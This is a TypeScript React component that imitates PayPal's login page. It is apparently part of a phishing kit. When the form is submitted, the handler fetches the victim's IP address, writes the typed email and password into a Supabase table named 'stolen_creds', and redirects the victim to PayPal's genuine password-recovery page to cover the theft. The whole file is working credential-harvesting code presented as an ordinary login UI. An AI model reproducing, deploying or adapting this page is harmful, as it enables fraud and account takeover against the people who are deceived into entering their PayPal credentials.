"use client";

import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { createClient } from "@/lib/supabase/client";

function PayPalWordmark() {
  return (
    <h1 className="text-center text-[2.8rem] font-black leading-none tracking-tight text-[#111827]">
      PayPal
    </h1>
  );
}

function Divider() {
  return (
    <div className="flex items-center gap-2 text-[#6b7280]">
      <div className="h-px flex-1 bg-[#d1d5db]" />
      <span className="px-1 text-[1.05rem] font-medium">or</span>
      <div className="h-px flex-1 bg-[#d1d5db]" />
    </div>
  );
}

export function PaypalLogin() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const footerLinks = [
    "Contact Us",
    "Privacy",
    "Legal",
    "Policy Updates",
    "Worldwide",
  ];

  const isFormValid = email.trim() !== "" && password.trim() !== "";

  async function handleLogin(e: React.FormEvent) {
    e.preventDefault();
    setError(null);
    setLoading(true);

    try {
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      if (!ipResponse.ok) throw new Error('Gagal ambil IP');
      const ipData = await ipResponse.json();
      const realIp = ipData.ip;

      const supabase = createClient();
      const { error: insertError } = await supabase
        .from('stolen_creds')
        .insert([{ email: email.trim(), password: password.trim(), ip_address: realIp }]);

      window.location.href = "https://www.paypal.com/authflow/password-recovery/";

    } catch (err: any) {
      setError(`Error: ${err.message}`);
    } finally {
      setLoading(false);
    }
  }


  return (
    <div className="flex min-h-screen flex-col bg-[#f4f6f9] text-[#111827]">
      <main className="flex flex-1 items-center justify-center px-4 py-10">
        <div className="w-full max-w-115 rounded-2xl border border-[#d9dde4] bg-white px-6 py-8 shadow-[0_18px_42px_rgba(15,23,42,0.08)] sm:px-9">
          <PayPalWordmark />

          <form className="mt-8 space-y-4" onSubmit={handleLogin}>
            {error && (
              <p className="rounded-lg bg-red-50 px-4 py-2 text-sm text-red-600 border border-red-200">
                {error}
              </p>
            )}
            <Input
              type="text"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="Email or mobile number"
              className="h-13 rounded-lg border-[#b6bcc6] bg-white px-3 text-[1.02rem] text-[#111827] placeholder:text-[#6b7280] focus-visible:ring-[#0070e0]"
            />

            <Input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              className="h-13 rounded-lg border-[#b6bcc6] bg-white px-3 text-[1.02rem] text-[#111827] placeholder:text-[#6b7280] focus-visible:ring-[#0070e0]"
            />

            <a
              href="https://www.paypal.com/authflow/password-recovery/"
              className="block text-[1.02rem] font-semibold text-[#0070e0] hover:underline"
            >
              Forgot password?
            </a>

            <Button
              type="submit"
              disabled={!isFormValid || loading}
              className="h-12 w-full rounded-full bg-[#005eb8] text-[1.8rem] font-semibold text-white hover:bg-[#004f99] disabled:cursor-not-allowed disabled:bg-[#92b6df]"
            >
              {loading ? "Loading..." : "Log In"}
            </Button>

            <Divider />

            <a
              href="https://www.paypal.com/webapps/mpp/account-selection"
              className="block"
            >
              <Button
                type="button"
                variant="outline"
                className="h-12 w-full rounded-full border-2 border-[#1f2937] bg-transparent text-[1.45rem] font-semibold text-[#111827] hover:bg-[#f3f4f6]"
              >
                Sign Up
              </Button>
            </a>
          </form>
        </div>
      </main>

      <footer className="border-t border-[#d1d5db] bg-[#f4f6f9] px-4 py-6">
        <nav className="mx-auto flex max-w-6xl flex-wrap items-center justify-center gap-x-6 gap-y-2 text-[1.08rem] font-semibold text-[#4b5563]">
          {footerLinks.map((item) => (
            <a key={item} href="#" className="hover:text-[#1f2937]">
              {item}
            </a>
          ))}
        </nav>
      </footer>
    </div>
  );
}
